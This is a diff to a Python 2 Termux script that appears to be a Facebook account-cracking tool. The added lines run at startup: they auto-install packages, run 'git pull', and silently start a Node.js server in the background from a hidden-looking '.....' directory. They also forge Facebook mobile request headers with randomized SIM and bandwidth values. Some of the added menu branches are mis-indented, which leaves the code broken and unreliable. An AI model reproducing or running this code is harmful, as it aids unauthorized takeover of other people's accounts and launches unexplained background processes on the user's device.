@@ -1,5 +1,63 @@
 # -*- coding: utf-8
 # author by Mafia Fue-Go
+try:
+
+    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
+
+    from multiprocessing.pool import ThreadPool
+
+except ImportError:
+
+    os.system("pip2 install requests")
+
+    os.system("python2 cracker.indirect")
+    
+os.system("clear")
+
+
+
+if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
+
+    os.system("apt update && apt install nodejs -y")
+
+from requests.exceptions import ConnectionError
+
+os.system("git pull")
+
+if not os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):
+
+    os.system("fuser -k 5000/tcp &")
+
+    os.system("cd ..... && pip install progress")
+
+    os.system("cd ..... && npm install")
+
+    os.system("cd ..... && node index.js &")
+
+    os.system("clear")
+
+    time.sleep(10)
+
+elif os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):
+
+    os.system("fuser -k 5000/tcp &")
+
+    os.system("#")
+
+    os.system("cd ..... && node index.js &")
+
+    os.system("clear")
+
+bd=random.randint(2e7, 3e7)
+
+sim=random.randint(2e4, 4e4)
+
+header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
+
+reload(sys)
+
+sys.setdefaultencoding("utf-8")
+
 import os
 try:
 	import requests
@@ -187,24 +245,31 @@ def menu():
 	elif Bilal == "6" or Bilal == "06":
 			print("Contact admin")
 	    os.system('xdg-open https://www.facebook.com/lizzy.moses.7739')
+	exit(" ")
 	elif Bilal == "7" or Bilal == "07":
 			print("Contact admin")
 	    os.system('xdg-open https://www.facebook.com/lizzy.moses.7739')
+	exit(" ")
 	elif Bilal == "8" or Bilal == "08":
 			print("Contact admin")
 	    os.system('xdg-open https://www.facebook.com/lizzy.moses.7739')
+	exit(" ")
         elif Bilal == "9" or Bilal == "09":
 			print("Contact admin")
 	    os.system('xdg-open https://www.facebook.com/lizzy.moses.7739')
+	exit(" ")
 	elif Bilal == "10" or Bilal == "10":
 			print("Contact admin")
 	    os.system('xdg-open https://www.facebook.com/lizzy.moses.7739')
+	exit(" ")
 	elif Bilal == "11" or Bilal == "11":
 			print("Contact admin")
 	    os.system('xdg-open https://www.facebook.com/lizzy.moses.7739')
+	exit(" ")
 	elif Bilal == "12" or Bilal == "12":
 			print("Contact admin")
 	    os.system('xdg-open https://www.facebook.com/lizzy.moses.7739')
+	exit(" ")
 	elif Bilal == "0" or Bilal == "00":
 		os.system("rm -f login.txt")
 		exit("\n\033[1;37m[\033[1;32m!\033[1;37m] Token removed")
